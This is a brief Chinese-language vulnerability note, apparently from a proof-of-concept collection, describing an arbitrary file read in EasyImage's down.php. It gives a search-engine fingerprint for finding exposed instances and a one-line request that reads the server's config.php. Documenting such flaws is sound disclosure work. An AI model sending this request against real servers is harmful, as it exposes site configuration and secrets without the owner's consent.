# EasyImage down.php 任意文件读取漏洞

## 漏洞描述

EasyImage down.php 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

<a-checkbox checked>EasyImage</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="EasyImage-简单图床"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1678874513039-c454fc7f-e231-4417-b7a9-ebadfa12d0ba.png)

验证POC

```plain
/application/down.php?dw=./config/config.php
```

![img](../../../.vuepress/public/img/1678874587131-e65d3f26-f9b1-4ada-9885-527a8627644b.png)